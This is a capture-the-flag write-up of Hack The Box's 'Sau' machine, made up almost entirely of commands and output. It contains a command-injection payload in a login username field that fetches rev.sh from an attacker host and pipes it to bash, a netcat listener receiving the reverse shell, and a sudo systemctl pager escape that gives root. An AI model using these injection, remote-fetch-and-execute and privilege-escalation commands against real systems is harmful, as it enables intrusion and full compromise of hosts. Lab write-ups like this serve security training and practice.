```
└──╼ [★]$ nmap -sC -A -p- -Pn 10.129.179.200
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-13 21:05 BST
Nmap scan report for 10.129.179.200
Host is up (0.083s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Thu, 13 Jul 2023 20:07:14 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Thu, 13 Jul 2023 20:06:49 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Thu, 13 Jul 2023 20:06:49 GMT
|_    Content-Length: 0
```

https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3


https://github.com/entr0pie/CVE-2023-27163

https://notes.sjtu.edu.cn/s/MUUhEymt7#



![image](https://github.com/Rogue-1/HTB/assets/105310322/eb39e2e0-55e6-4fd4-9042-95e0c8daf323)

![image](https://github.com/Rogue-1/HTB/assets/105310322/b72b6235-9bc6-4c77-b69e-4429b229ddae)

![image](https://github.com/Rogue-1/HTB/assets/105310322/ca3f4c9e-cb08-4f35-bde2-69d220cba015)


![image](https://github.com/Rogue-1/HTB/assets/105310322/c9306149-ddb9-40d8-9ac0-0db22caa475e)

```
└──╼ [★]$ curl -X POST --data 'username=;`curl -X POST http://10.129.166.37:55555/2nv68gc/login --data "$(id)"`' http://10.129.166.37:55555/2nv68gc/login
```


![image](https://github.com/Rogue-1/HTB/assets/105310322/15b37510-cde2-481c-bfb5-3a28f66a5000)



```
└──╼ [★]$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.166.37 - - [25/Jul/2023 20:51:58] "GET /rev.sh HTTP/1.1" 200 -
```


```
└──╼ [★]$ curl -X POST --data 'username=;`curl -X POST http://10.129.166.37:55555/2nv68gc/login --data "$(curl http://10.10.14.78:8000/rev.sh|bash)"`' http://10.129.166.37:55555/2nv68gc/login
```


```
└──╼ [★]$ nc -lvnp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.166.37.
Ncat: Connection from 10.129.166.37:44844.
sh: 0: can't access tty; job control turned off
$ id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
$ 


$ cat user.txt
c9d8f5bbb***********************
```

```
$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
```
$ script /dev/null /bin/bash
Script started, file is /dev/null
puma@sau:/opt/maltrail$ sudo systemctl status trail.service
sudo systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!sh
!sshh!sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

```
# cat /root/root.txt
cat /root/root.txt
c5135dea66**********************
**********
```
